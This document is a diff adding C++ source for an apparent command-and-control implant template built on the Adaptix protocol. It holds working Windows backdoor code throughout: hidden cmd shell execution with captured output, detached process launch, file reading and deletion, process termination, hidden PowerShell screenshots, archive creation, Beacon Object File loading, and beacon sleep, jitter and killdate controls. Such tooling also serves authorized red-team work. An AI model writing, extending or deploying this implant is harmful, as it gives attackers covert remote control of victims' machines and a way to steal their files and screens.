@@ -1,0 +1,895 @@
+// __NAME__ Agent — Commander Implementation (adaptix_default protocol)
+//
+// Wire format (server → agent, Little-Endian):
+//   [LE uint32 totalSize][repeated: [LE uint32 cmdCode][LE fields…][LE uint32 taskId]]
+//
+// Wire format (agent → server, Big-Endian):
+//   [BE uint32 totalBlobSize][repeated: [BE uint32 taskId][BE uint32 cmdCode][BE fields…]]
+//
+// Command levels:
+//   L3 — fully implemented (no platform-specific evasion needed)
+//   L2 — partially implemented (uses Win32 API directly)
+//   L1 — explicit unsupported response
+
+#include "Commander.h"
+#include "Agent.h"
+#include "bof_loader.h"
+#include "../protocol/protocol.h"
+
+#include <stdio.h>
+#include <string>
+#include <vector>
+
+static WriterBE* buildOutputMessageResp(uint32_t kind, const uint8_t* data, uint32_t len)
+{
+    WriterBE* w = WriterBEInit(32 + len);
+    WriterBEWriteUint32(w, kind);
+    WriterBEWriteBytes(w, data, len);
+    return w;
+}
+
+static BOOL runDetachedProcess(const char* program, const char* args, DWORD* outPid)
+{
+    if (!program || !program[0]) {
+        SetLastError(ERROR_INVALID_PARAMETER);
+        return FALSE;
+    }
+
+    char cmdLine[2048];
+    if (args && args[0]) {
+        snprintf(cmdLine, sizeof(cmdLine), "\"%s\" %s", program, args);
+    } else {
+        snprintf(cmdLine, sizeof(cmdLine), "\"%s\"", program);
+    }
+
+    STARTUPINFOA si = {};
+    PROCESS_INFORMATION pi = {};
+    si.cb = sizeof(si);
+    BOOL ok = CreateProcessA(NULL, cmdLine, NULL, NULL, FALSE, CREATE_NO_WINDOW | DETACHED_PROCESS, NULL, NULL, &si, &pi);
+    if (!ok) {
+        return FALSE;
+    }
+    if (outPid) {
+        *outPid = pi.dwProcessId;
+    }
+    CloseHandle(pi.hThread);
+    CloseHandle(pi.hProcess);
+    return TRUE;
+}
+
+static BOOL runShellCapture(const char* cmdLine, std::string* outText)
+{
+    if (!cmdLine || !outText) {
+        SetLastError(ERROR_INVALID_PARAMETER);
+        return FALSE;
+    }
+
+    SECURITY_ATTRIBUTES sa = {};
+    sa.nLength = sizeof(sa);
+    sa.bInheritHandle = TRUE;
+
+    HANDLE readPipe = NULL;
+    HANDLE writePipe = NULL;
+    if (!CreatePipe(&readPipe, &writePipe, &sa, 0)) {
+        return FALSE;
+    }
+    SetHandleInformation(readPipe, HANDLE_FLAG_INHERIT, 0);
+
+    char fullCmd[2048];
+    snprintf(fullCmd, sizeof(fullCmd), "cmd /C %s", cmdLine);
+
+    STARTUPINFOA si = {};
+    PROCESS_INFORMATION pi = {};
+    si.cb = sizeof(si);
+    si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
+    si.wShowWindow = SW_HIDE;
+    si.hStdOutput = writePipe;
+    si.hStdError = writePipe;
+
+    BOOL ok = CreateProcessA(NULL, fullCmd, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
+    CloseHandle(writePipe);
+    if (!ok) {
+        CloseHandle(readPipe);
+        return FALSE;
+    }
+
+    std::string output;
+    char buffer[4096];
+    DWORD bytesRead = 0;
+    while (ReadFile(readPipe, buffer, sizeof(buffer), &bytesRead, NULL) && bytesRead > 0) {
+        output.append(buffer, buffer + bytesRead);
+    }
+
+    WaitForSingleObject(pi.hProcess, INFINITE);
+    CloseHandle(pi.hThread);
+    CloseHandle(pi.hProcess);
+    CloseHandle(readPipe);
+
+    *outText = output;
+    return TRUE;
+}
+
+static BOOL zipPathToFile(const char* srcPath, const char* zipPath)
+{
+    if (!srcPath || !zipPath) {
+        SetLastError(ERROR_INVALID_PARAMETER);
+        return FALSE;
+    }
+
+    char psCmd[4096];
+    snprintf(psCmd, sizeof(psCmd),
+        "powershell -NoProfile -Command \"Compress-Archive -Force -Path '%s' -DestinationPath '%s'\"",
+        srcPath, zipPath);
+
+    STARTUPINFOA si = {};
+    PROCESS_INFORMATION pi = {};
+    si.cb = sizeof(si);
+    si.dwFlags = STARTF_USESHOWWINDOW;
+    si.wShowWindow = SW_HIDE;
+
+    BOOL ok = CreateProcessA(NULL, psCmd, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
+    if (!ok) {
+        return FALSE;
+    }
+
+    WaitForSingleObject(pi.hProcess, INFINITE);
+    DWORD exitCode = 1;
+    GetExitCodeProcess(pi.hProcess, &exitCode);
+    CloseHandle(pi.hThread);
+    CloseHandle(pi.hProcess);
+    if (exitCode != 0) {
+        SetLastError(ERROR_GEN_FAILURE);
+        return FALSE;
+    }
+    return TRUE;
+}
+
+static BOOL captureScreenshotPng(std::vector<BYTE>* outData)
+{
+    if (!outData) {
+        SetLastError(ERROR_INVALID_PARAMETER);
+        return FALSE;
+    }
+
+    char tempDir[MAX_PATH] = {0};
+    if (GetTempPathA(MAX_PATH, tempDir) == 0) {
+        return FALSE;
+    }
+
+    char tempFile[MAX_PATH] = {0};
+    if (GetTempFileNameA(tempDir, "axs", 0, tempFile) == 0) {
+        return FALSE;
+    }
+    DeleteFileA(tempFile);
+    strcat_s(tempFile, MAX_PATH, ".png");
+
+    char psCmd[8192];
+    snprintf(psCmd, sizeof(psCmd),
+        "powershell -NoProfile -Command \"Add-Type -AssemblyName System.Windows.Forms; Add-Type -AssemblyName System.Drawing; $b=[System.Windows.Forms.SystemInformation]::VirtualScreen; $bmp=New-Object System.Drawing.Bitmap $b.Width,$b.Height; $g=[System.Drawing.Graphics]::FromImage($bmp); $g.CopyFromScreen($b.Left,$b.Top,0,0,$bmp.Size); $bmp.Save('%s', [System.Drawing.Imaging.ImageFormat]::Png); $g.Dispose(); $bmp.Dispose()\"",
+        tempFile);
+
+    STARTUPINFOA si = {};
+    PROCESS_INFORMATION pi = {};
+    si.cb = sizeof(si);
+    si.dwFlags = STARTF_USESHOWWINDOW;
+    si.wShowWindow = SW_HIDE;
+
+    BOOL ok = CreateProcessA(NULL, psCmd, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
+    if (!ok) {
+        return FALSE;
+    }
+
+    WaitForSingleObject(pi.hProcess, INFINITE);
+    DWORD exitCode = 1;
+    GetExitCodeProcess(pi.hProcess, &exitCode);
+    CloseHandle(pi.hThread);
+    CloseHandle(pi.hProcess);
+    if (exitCode != 0) {
+        DeleteFileA(tempFile);
+        SetLastError(ERROR_GEN_FAILURE);
+        return FALSE;
+    }
+
+    HANDLE hFile = CreateFileA(tempFile, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+    if (hFile == INVALID_HANDLE_VALUE) {
+        DeleteFileA(tempFile);
+        return FALSE;
+    }
+
+    DWORD fileSize = GetFileSize(hFile, NULL);
+    outData->resize(fileSize);
+    DWORD bytesRead = 0;
+    ok = ReadFile(hFile, outData->data(), fileSize, &bytesRead, NULL);
+    CloseHandle(hFile);
+    DeleteFileA(tempFile);
+
+    if (!ok) {
+        outData->clear();
+        return FALSE;
+    }
+    outData->resize(bytesRead);
+    return TRUE;
+}
+
+Commander::Commander(Agent* a)
+{
+    this->agent = a;
+}
+
+Commander::~Commander()
+{
+}
+
+// ─── WriterBE raw append (no length prefix) ────────────────────────────────────
+
+static void WriterBEAppendRaw(WriterBE* w, const uint8_t* data, uint32_t len)
+{
+    while (w->size + len > w->capacity) {
+        w->capacity = (w->capacity == 0) ? 256 : w->capacity * 2;
+        w->data = (uint8_t*)realloc(w->data, w->capacity);
+    }
+    if (len > 0 && data) {
+        memcpy(w->data + w->size, data, len);
+        w->size += len;
+    }
+}
+
+// ─── Error response: [BE uint32 errorCode] under COMMAND_ERROR ─────────────────
+
+static WriterBE* buildCommandErrorResp(uint32_t code)
+{
+    WriterBE* w = WriterBEInit(16);
+    WriterBEWriteUint32(w, code);
+    return w;
+}
+
+static WriterBE* buildSystemErrorResp()
+{
+    DWORD err = GetLastError();
+    if (err == ERROR_FILE_NOT_FOUND || err == ERROR_PATH_NOT_FOUND)
+        return buildCommandErrorResp(2);
+    if (err == ERROR_ACCESS_DENIED)
+        return buildCommandErrorResp(5);
+    return buildCommandErrorResp(31);
+}
+
+static WriterBE* buildUnsupportedResp()
+{
+    return buildCommandErrorResp(50);
+}
+
+static void DecodeWorkingTime(uint32_t wt, int* workStart, int* workEnd)
+{
+    if (!workStart || !workEnd) {
+        return;
+    }
+    if (wt == 0) {
+        *workStart = 0;
+        *workEnd = 0;
+        return;
+    }
+    int startHour = (int)((wt >> 24) & 0xff);
+    int startMin  = (int)((wt >> 16) & 0xff);
+    int endHour   = (int)((wt >> 8) & 0xff);
+    int endMin    = (int)(wt & 0xff);
+    *workStart = startHour * 100 + startMin;
+    *workEnd   = endHour * 100 + endMin;
+}
+
+// ─── Win32 helpers ─────────────────────────────────────────────────────────────
+
+static BOOL MkdirRecursive(const char* path)
+{
+    if (CreateDirectoryA(path, NULL))
+        return TRUE;
+    if (GetLastError() == ERROR_ALREADY_EXISTS)
+        return TRUE;
+
+    char tmp[MAX_PATH];
+    strncpy(tmp, path, MAX_PATH - 1);
+    tmp[MAX_PATH - 1] = '\0';
+    for (int i = (int)strlen(tmp) - 1; i > 0; i--) {
+        if (tmp[i] == '\\' || tmp[i] == '/') {
+            tmp[i] = '\0';
+            MkdirRecursive(tmp);
+            tmp[i] = '\\';
+            break;
+        }
+    }
+    if (CreateDirectoryA(path, NULL))
+        return TRUE;
+    return (GetLastError() == ERROR_ALREADY_EXISTS);
+}
+
+static BOOL RemoveRecursive(const char* path)
+{
+    DWORD attrs = GetFileAttributesA(path);
+    if (attrs == INVALID_FILE_ATTRIBUTES)
+        return FALSE;
+    if (!(attrs & FILE_ATTRIBUTE_DIRECTORY))
+        return DeleteFileA(path);
+
+    char search[MAX_PATH];
+    snprintf(search, MAX_PATH, "%s\\*", path);
+    WIN32_FIND_DATAA fd;
+    HANDLE hFind = FindFirstFileA(search, &fd);
+    if (hFind == INVALID_HANDLE_VALUE)
+        return FALSE;
+    do {
+        if (strcmp(fd.cFileName, ".") == 0 || strcmp(fd.cFileName, "..") == 0)
+            continue;
+        char child[MAX_PATH];
+        snprintf(child, MAX_PATH, "%s\\%s", path, fd.cFileName);
+        RemoveRecursive(child);
+    } while (FindNextFileA(hFind, &fd));
+    FindClose(hFind);
+    return RemoveDirectoryA(path);
+}
+
+// ─── Profile sub-command handler ───────────────────────────────────────────────
+
+static WriterBE* handleProfile(Agent* agent, ReaderLE* r, uint32_t subcmd)
+{
+    WriterBE* w = WriterBEInit(64);
+    WriterBEWriteUint32(w, subcmd);
+
+    switch (subcmd) {
+    case 1: { // sleep + jitter
+        uint32_t sleep  = ReaderLEReadUint32(r);
+        uint32_t jitter = ReaderLEReadUint32(r);
+        agent->sleepMs = sleep * 1000;
+        agent->jitter  = jitter;
+        WriterBEWriteUint32(w, sleep);
+        WriterBEWriteUint32(w, jitter);
+        break;
+    }
+    case 2: { // download chunk size
+        uint32_t size = ReaderLEReadUint32(r);
+        WriterBEWriteUint32(w, size);
+        break;
+    }
+    case 3: { // killdate
+        uint32_t kd = ReaderLEReadUint32(r);
+        agent->killDate = (INT64)kd;
+        WriterBEWriteUint32(w, kd);
+        break;
+    }
+    case 4: { // workingtime
+        uint32_t wt = ReaderLEReadUint32(r);
+        DecodeWorkingTime(wt, &agent->workStart, &agent->workEnd);
+        WriterBEWriteUint32(w, wt);
+        break;
+    }
+    case 5: { // burst set
+        uint32_t enabled    = ReaderLEReadUint32(r);
+        uint32_t burstSleep = ReaderLEReadUint32(r);
+        uint32_t burstJit   = ReaderLEReadUint32(r);
+        WriterBEWriteUint32(w, enabled);
+        WriterBEWriteUint32(w, burstSleep);
+        WriterBEWriteUint32(w, burstJit);
+        break;
+    }
+    case 6: { // burst show
+        WriterBEWriteUint32(w, 0);  // enabled
+        WriterBEWriteUint32(w, 50); // sleep ms
+        WriterBEWriteUint32(w, 0);  // jitter
+        break;
+    }
+    default:
+        break;
+    }
+    return w;
+}
+
+// ═══════════════════════════════════════════════════════════════════════════════
+// ProcessCommandTasks — adaptix_default protocol dispatcher
+// ═══════════════════════════════════════════════════════════════════════════════
+
+void Commander::ProcessCommandTasks(BYTE* recv, ULONG recvSize, BYTE* outBuf, ULONG* outSize)
+{
+    *outSize = 0;
+    if (!recv || recvSize < 4)
+        return;
+
+    ReaderLE r;
+    ReaderLEInit(&r, recv, recvSize);
+
+    uint32_t totalSize = ReaderLEReadUint32(&r);
+    (void)totalSize;
+
+    // Output: one big WriterBE, start with placeholder for totalBlobSize
+    WriterBE* out = WriterBEInit(1024);
+    WriterBEWriteUint32(out, 0); // placeholder
+
+    BOOL hasAnyResp = FALSE;
+
+    while (r.offset + 4 <= r.size) {
+        uint32_t cmdCode = ReaderLEReadUint32(&r);
+
+        WriterBE* respW = NULL;
+        uint32_t respCmdCode = cmdCode;
+        uint32_t taskId = 0;
+        BOOL taskIdConsumed = FALSE;
+
+        switch (cmdCode) {
+
+        // ── L3: Exit / Terminate ───────────────────────────────────────────
+
+        case COMMAND_TERMINATE: {
+            ReaderLEReadUint32(&r); // subcode
+            ExitProcess(0);
+            break;
+        }
+        case COMMAND_EXIT: {
+            ReaderLEReadUint32(&r); // exitMethod
+            ExitProcess(0);
+            break;
+        }
+
+        // ── L3: PWD ────────────────────────────────────────────────────────
+
+        case COMMAND_PWD: {
+            char cwd[MAX_PATH];
+            DWORD len = GetCurrentDirectoryA(MAX_PATH, cwd);
+            if (len == 0) {
+                respW = buildSystemErrorResp();
+                respCmdCode = COMMAND_ERROR;
+            } else {
+                respW = WriterBEInit(256);
+                WriterBEWriteString(respW, cwd);
+            }
+            break;
+        }
+
+        // ── L3: CD ─────────────────────────────────────────────────────────
+
+        case COMMAND_CD: {
+            char* path = ReaderLEReadString(&r);
+            if (!SetCurrentDirectoryA(path)) {
+                respW = buildSystemErrorResp();
+                respCmdCode = COMMAND_ERROR;
+            } else {
+                char cwd[MAX_PATH];
+                GetCurrentDirectoryA(MAX_PATH, cwd);
+                respW = WriterBEInit(256);
+                WriterBEWriteString(respW, cwd);
+            }
+            free(path);
+            break;
+        }
+
+        // ── L3: CAT ────────────────────────────────────────────────────────
+
+        case COMMAND_CAT: {
+            char* path = ReaderLEReadString(&r);
+            HANDLE hFile = CreateFileA(path, GENERIC_READ, FILE_SHARE_READ, NULL,
+                                       OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+            if (hFile == INVALID_HANDLE_VALUE) {
+                respW = buildSystemErrorResp();
+                respCmdCode = COMMAND_ERROR;
+                free(path); break;
+            }
+            DWORD fileSize = GetFileSize(hFile, NULL);
+            BYTE* buf = (BYTE*)malloc(fileSize > 0 ? fileSize : 1);
+            DWORD bytesRead = 0;
+            ReadFile(hFile, buf, fileSize, &bytesRead, NULL);
+            CloseHandle(hFile);
+
+            respW = WriterBEInit(256 + bytesRead);
+            WriterBEWriteString(respW, path);
+            WriterBEWriteBytes(respW, buf, bytesRead);
+            free(buf); free(path);
+            break;
+        }
+
+        // ── L3: MKDIR ──────────────────────────────────────────────────────
+
+        case COMMAND_MKDIR: {
+            char* path = ReaderLEReadString(&r);
+            if (!MkdirRecursive(path)) {
+                respW = buildSystemErrorResp();
+                respCmdCode = COMMAND_ERROR;
+            } else {
+                respW = WriterBEInit(64);
+                WriterBEWriteString(respW, path);
+            }
+            free(path);
+            break;
+        }
+
+        // ── L3: RM ─────────────────────────────────────────────────────────
+
+        case COMMAND_RM: {
+            char* path = ReaderLEReadString(&r);
+            if (!RemoveRecursive(path)) {
+                respW = buildSystemErrorResp();
+                respCmdCode = COMMAND_ERROR;
+            }
+            else {
+                respW = WriterBEInit(4);
+                // empty response body
+            }
+            free(path);
+            break;
+        }
+
+        // ── L3: MV ─────────────────────────────────────────────────────────
+
+        case COMMAND_MV: {
+            char* src = ReaderLEReadString(&r);
+            char* dst = ReaderLEReadString(&r);
+            if (!MoveFileA(src, dst)) {
+                respW = buildSystemErrorResp();
+                respCmdCode = COMMAND_ERROR;
+            }
+            else {
+                respW = WriterBEInit(4);
+            }
+            free(src); free(dst);
+            break;
+        }
+
+        // ── L3: COPY ───────────────────────────────────────────────────────
+
+        case COMMAND_COPY: {
+            char* src = ReaderLEReadString(&r);
+            char* dst = ReaderLEReadString(&r);
+            if (!CopyFileA(src, dst, FALSE)) {
+                respW = buildSystemErrorResp();
+                respCmdCode = COMMAND_ERROR;
+            }
+            else {
+                respW = WriterBEInit(4);
+            }
+            free(src); free(dst);
+            break;
+        }
+
+        // ── L3: KILL ───────────────────────────────────────────────────────
+
+        case COMMAND_KILL: {
+            uint32_t pid = ReaderLEReadUint32(&r);
+            HANDLE hProc = OpenProcess(PROCESS_TERMINATE, FALSE, pid);
+            if (!hProc) {
+                respW = buildSystemErrorResp();
+                respCmdCode = COMMAND_ERROR;
+            } else {
+                if (!TerminateProcess(hProc, 1)) {
+                    respW = buildSystemErrorResp();
+                    respCmdCode = COMMAND_ERROR;
+                }
+                else {
+                    respW = WriterBEInit(4);
+                }
+                CloseHandle(hProc);
+            }
+            break;
+        }
+
+        // ── L3: PS_KILL ────────────────────────────────────────────────────
+
+        case COMMAND_PS_KILL: {
+            uint32_t pid = ReaderLEReadUint32(&r);
+            HANDLE hProc = OpenProcess(PROCESS_TERMINATE, FALSE, pid);
+            if (!hProc) {
+                respW = buildSystemErrorResp();
+                respCmdCode = COMMAND_ERROR;
+            } else {
+                if (!TerminateProcess(hProc, 1)) {
+                    respW = buildSystemErrorResp();
+                    respCmdCode = COMMAND_ERROR;
+                }
+                else {
+                    respW = WriterBEInit(4);
+                }
+                CloseHandle(hProc);
+            }
+            break;
+        }
+
+        // ── L3: PROFILE ────────────────────────────────────────────────────
+
+        case COMMAND_PROFILE: {
+            uint32_t subcmd = ReaderLEReadUint32(&r);
+            respW = handleProfile(agent, &r, subcmd);
+            break;
+        }
+
+        // ── L2: LS ─────────────────────────────────────────────────────────
+
+        case COMMAND_LS: {
+            char* dir = ReaderLEReadString(&r);
+            char searchDir[MAX_PATH];
+            if (!dir || strlen(dir) == 0) {
+                GetCurrentDirectoryA(MAX_PATH, searchDir);
+            } else {
+                strncpy(searchDir, dir, MAX_PATH - 1);
+                searchDir[MAX_PATH - 1] = '\0';
+            }
+
+            char findPath[MAX_PATH];
+            snprintf(findPath, MAX_PATH, "%s\\*", searchDir);
+
+            WIN32_FIND_DATAA fd;
+            HANDLE hFind = FindFirstFileA(findPath, &fd);
+            if (hFind == INVALID_HANDLE_VALUE) {
+                respW = WriterBEInit(16);
+                WriterBEWriteUint8(respW, 0); // result = error
+                WriterBEWriteUint32(respW, 1);
+                free(dir); break;
+            }
+
+            respW = WriterBEInit(4096);
+            WriterBEWriteUint8(respW, 1); // result = success
+
+            // path + \* suffix
+            char absPath[MAX_PATH];
+            snprintf(absPath, MAX_PATH, "%s\\*", searchDir);
+            WriterBEWriteString(respW, absPath);
+
+            // Count entries first, then write
+            // Actually, write count placeholder, fill entries, patch count
+            uint32_t countPos = respW->size;
+            WriterBEWriteUint32(respW, 0); // placeholder
+
+            uint32_t entryCount = 0;
+            do {
+                if (strcmp(fd.cFileName, ".") == 0 || strcmp(fd.cFileName, "..") == 0)
+                    continue;
+                BOOL isDir = (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) != 0;
+                int64_t fsize = ((int64_t)fd.nFileSizeHigh << 32) | fd.nFileSizeLow;
+
+                SYSTEMTIME st;
+                FileTimeToSystemTime(&fd.ftLastWriteTime, &st);
+                // Encode date as unix-ish epoch seconds
+                FILETIME localFt;
+                FileTimeToLocalFileTime(&fd.ftLastWriteTime, &localFt);
+                ULARGE_INTEGER uli;
+                uli.LowPart  = localFt.dwLowDateTime;
+                uli.HighPart = localFt.dwHighDateTime;
+                // Convert FILETIME (100ns since 1601) to unix timestamp
+                uint32_t unixTime = (uint32_t)((uli.QuadPart - 116444736000000000ULL) / 10000000ULL);
+
+                WriterBEWriteUint8(respW, isDir ? 1 : 0);
+                WriterBEWriteUint64(respW, (uint64_t)fsize);
+                WriterBEWriteUint32(respW, unixTime);
+                WriterBEWriteString(respW, fd.cFileName);
+                entryCount++;
+            } while (FindNextFileA(hFind, &fd));
+            FindClose(hFind);
+
+            // Patch entry count (BE uint32)
+            respW->data[countPos + 0] = (uint8_t)(entryCount >> 24);
+            respW->data[countPos + 1] = (uint8_t)(entryCount >> 16);
+            respW->data[countPos + 2] = (uint8_t)(entryCount >> 8);
+            respW->data[countPos + 3] = (uint8_t)(entryCount);
+            free(dir);
+            break;
+        }
+
+        // ── L2: PS_LIST (empty result) ─────────────────────────────────────
+
+        case COMMAND_PS_LIST: {
+            // Return empty list
+            respW = WriterBEInit(16);
+            WriterBEWriteUint8(respW, 1); // result = success
+            WriterBEWriteUint32(respW, 0); // count = 0
+            break;
+        }
+
+        // ── L2: GETUID ─────────────────────────────────────────────────────
+
+        case COMMAND_GETUID: {
+            char username[256] = {0};
+            DWORD uLen = sizeof(username);
+            GetUserNameA(username, &uLen);
+            char domain[256] = {0};
+            GetEnvironmentVariableA("USERDOMAIN", domain, sizeof(domain));
+
+            BOOL elevated = FALSE;
+            HANDLE hToken = NULL;
+            if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
+                TOKEN_ELEVATION elev = {0};
+                DWORD retLen = 0;
+                if (GetTokenInformation(hToken, TokenElevation, &elev, sizeof(elev), &retLen))
+                    elevated = elev.TokenIsElevated;
+                CloseHandle(hToken);
+            }
+
+            respW = WriterBEInit(256);
+            WriterBEWriteUint8(respW, elevated ? 1 : 0);
+            WriterBEWriteString(respW, domain);
+            WriterBEWriteString(respW, username);
+            break;
+        }
+
+        // ── L2: JOB_LIST (empty) ───────────────────────────────────────────
+
+        case COMMAND_JOB_LIST: {
+            respW = WriterBEInit(16);
+            WriterBEWriteUint32(respW, 0); // count = 0
+            break;
+        }
+
+        // ── L2: JOBS_KILL (not found result) ───────────────────────────────
+
+        case COMMAND_JOBS_KILL: {
+            uint32_t jobId = ReaderLEReadUint32(&r);
+            respW = WriterBEInit(16);
+            WriterBEWriteUint8(respW, 0);           // result = not found
+            WriterBEWriteUint32(respW, jobId);
+            break;
+        }
+
+        // ── L2: RUN ────────────────────────────────────────────────────────
+
+        case COMMAND_RUN: {
+            char* prog = ReaderLEReadString(&r);
+            char* args = ReaderLEReadString(&r);
+            taskId = ReaderLEReadUint32(&r); // taskId is inside RUN data
+            taskIdConsumed = TRUE;
+            DWORD pid = 0;
+            if (!runDetachedProcess(prog, args, &pid)) {
+                respW = buildSystemErrorResp();
+                respCmdCode = COMMAND_ERROR;
+            } else {
+                respW = WriterBEInit(64 + (uint32_t)strlen(prog));
+                WriterBEWriteUint32(respW, pid);
+                WriterBEWriteUint8(respW, 0);
+                WriterBEWriteString(respW, prog);
+            }
+            free(prog); free(args);
+            break;
+        }
+
+        // ── L2: SHELL ──────────────────────────────────────────────────────
+
+        case COMMAND_SHELL: {
+            char* cmdLine = ReaderLEReadString(&r);
+            std::string output;
+            if (!runShellCapture(cmdLine, &output)) {
+                respW = buildSystemErrorResp();
+                respCmdCode = COMMAND_ERROR;
+            } else {
+                respW = WriterBEInit((uint32_t)output.size() + 32);
+                WriterBEWriteString(respW, output.c_str());
+            }
+            free(cmdLine);
+            break;
+        }
+
+        // ── L2: SCREENSHOT ─────────────────────────────────────────────────
+
+        case COMMAND_SCREENSHOT: {
+            std::vector<BYTE> img;
+            if (!captureScreenshotPng(&img)) {
+                respW = buildSystemErrorResp();
+                respCmdCode = COMMAND_ERROR;
+            } else {
+                respW = WriterBEInit((uint32_t)img.size() + 16);
+                WriterBEWriteBytes(respW, img.data(), (uint32_t)img.size());
+            }
+            break;
+        }
+
+        // ── L2: ZIP ────────────────────────────────────────────────────────
+
+        case COMMAND_ZIP: {
+            char* srcPath = ReaderLEReadString(&r);
+            char* zipPath = ReaderLEReadString(&r);
+            if (!zipPathToFile(srcPath, zipPath)) {
+                respW = buildSystemErrorResp();
+                respCmdCode = COMMAND_ERROR;
+            } else {
+                respW = WriterBEInit((uint32_t)strlen(zipPath) + 16);
+                WriterBEWriteString(respW, zipPath);
+            }
+            free(srcPath); free(zipPath);
+            break;
+        }
+
+        // ── L2: BOF (routes through scaffold loader surface) ───────────────
+
+        case COMMAND_EXEC_BOF: {
+            BOOL async = ReaderLEReadUint8(&r) ? TRUE : FALSE;
+            char* entry = ReaderLEReadString(&r); // entry function
+            uint32_t bofLen;
+            uint8_t* bof = ReaderLEReadBytes(&r, &bofLen); // [4B len][bof data] — returns ptr, don't free
+            uint32_t argsLen;
+            uint8_t* args = ReaderLEReadBytes(&r, &argsLen); // [4B len][args data]
+
+            BofContext* ctx = async
+                ? ObjectExecuteAsync(bof, bofLen, args, (int)argsLen)
+                : ObjectExecute(bof, bofLen, args, (int)argsLen);
+
+            if (!ctx || ctx->msgCount == 0) {
+                const char* msg = async
+                    ? "async BOF execution requires the native loader implementation"
+                    : "BOF execution requires the native loader implementation";
+                respW = buildOutputMessageResp(CALLBACK_ERROR, (const uint8_t*)msg, (uint32_t)strlen(msg));
+            } else {
+                    respW = buildOutputMessageResp((uint32_t)ctx->msgs[0].type, ctx->msgs[0].data, (uint32_t)ctx->msgs[0].dataLen);
+            }
+            respCmdCode = COMMAND_EXEC_BOF_OUT;
+            if (ctx) {
+                BofContextFree(ctx);
+            }
+            free(entry);
+            break;
+        }
+
+        // ── L1: SAVEMEMORY (consume, no response) ──────────────────────────
+
+        case COMMAND_SAVEMEMORY: {
+            ReaderLEReadUint32(&r); // memoryId
+            ReaderLEReadUint32(&r); // totalSize
+            uint32_t chunkLen;
+            ReaderLEReadBytes(&r, &chunkLen); // [4B chunkSize][chunk data]
+            // No response
+            break;
+        }
+
+        default:
+            // Unknown command — try to skip gracefully, but since we don't
+            // know the field layout we can't guarantee correct parsing.
+            break;
+        }
+
+        // Read taskId if not consumed by the handler
+        if (!taskIdConsumed && r.offset + 4 <= r.size) {
+            taskId = ReaderLEReadUint32(&r);
+        }
+
+        // Emit response: [BE taskId][BE cmdCode][response data]
+        if (respW && respW->size > 0) {
+            WriterBEWriteUint32(out, taskId);
+            WriterBEWriteUint32(out, respCmdCode);
+            WriterBEAppendRaw(out, respW->data, respW->size);
+            hasAnyResp = TRUE;
+        }
+        if (respW)
+            WriterBEFree(respW);
+    }
+
+    if (!hasAnyResp) {
+        WriterBEFree(out);
+        return;
+    }
+
+    // Patch totalBlobSize at offset 0 (BE uint32, includes itself)
+    uint32_t total = out->size;
+    out->data[0] = (uint8_t)(total >> 24);
+    out->data[1] = (uint8_t)(total >> 16);
+    out->data[2] = (uint8_t)(total >> 8);
+    out->data[3] = (uint8_t)(total);
+
+    memcpy(outBuf, out->data, out->size);
+    *outSize = out->size;
+    WriterBEFree(out);
+}
+
+// ── Linker shim methods (all protocol logic lives in ProcessCommandTasks) ────
+
+void Commander::CmdTerminate(ULONG c, BYTE* d, ULONG s)       { (void)c;(void)d;(void)s; }
+void Commander::CmdFsList(ULONG c, BYTE* d, ULONG s)          { (void)c;(void)d;(void)s; }
+void Commander::CmdFsUpload(ULONG c, BYTE* d, ULONG s)        { (void)c;(void)d;(void)s; }
+void Commander::CmdFsDownload(ULONG c, BYTE* d, ULONG s)      { (void)c;(void)d;(void)s; }
+void Commander::CmdFsRemove(ULONG c, BYTE* d, ULONG s)        { (void)c;(void)d;(void)s; }
+void Commander::CmdFsMkdirs(ULONG c, BYTE* d, ULONG s)        { (void)c;(void)d;(void)s; }
+void Commander::CmdFsCopy(ULONG c, BYTE* d, ULONG s)          { (void)c;(void)d;(void)s; }
+void Commander::CmdFsMove(ULONG c, BYTE* d, ULONG s)          { (void)c;(void)d;(void)s; }
+void Commander::CmdFsCd(ULONG c, BYTE* d, ULONG s)            { (void)c;(void)d;(void)s; }
+void Commander::CmdFsPwd(ULONG c, BYTE* d, ULONG s)           { (void)c;(void)d;(void)s; }
+void Commander::CmdFsCat(ULONG c, BYTE* d, ULONG s)           { (void)c;(void)d;(void)s; }
+void Commander::CmdOsRun(ULONG c, BYTE* d, ULONG s)           { (void)c;(void)d;(void)s; }
+void Commander::CmdOsInfo(ULONG c, BYTE* d, ULONG s)          { (void)c;(void)d;(void)s; }
+void Commander::CmdOsPs(ULONG c, BYTE* d, ULONG s)            { (void)c;(void)d;(void)s; }
+void Commander::CmdOsScreenshot(ULONG c, BYTE* d, ULONG s)    { (void)c;(void)d;(void)s; }
+void Commander::CmdOsShell(ULONG c, BYTE* d, ULONG s)         { (void)c;(void)d;(void)s; }
+void Commander::CmdOsKill(ULONG c, BYTE* d, ULONG s)          { (void)c;(void)d;(void)s; }
+void Commander::CmdProfileSleep(ULONG c, BYTE* d, ULONG s)    { (void)c;(void)d;(void)s; }
+void Commander::CmdProfileKilldate(ULONG c, BYTE* d, ULONG s) { (void)c;(void)d;(void)s; }
+void Commander::CmdProfileWorktime(ULONG c, BYTE* d, ULONG s) { (void)c;(void)d;(void)s; }
+void Commander::CmdExecBof(ULONG c, BYTE* d, ULONG s)         { (void)c;(void)d;(void)s; }
+void Commander::CmdJobList(ULONG c, BYTE* d, ULONG s)         { (void)c;(void)d;(void)s; }
+void Commander::CmdJobKill(ULONG c, BYTE* d, ULONG s)         { (void)c;(void)d;(void)s; }
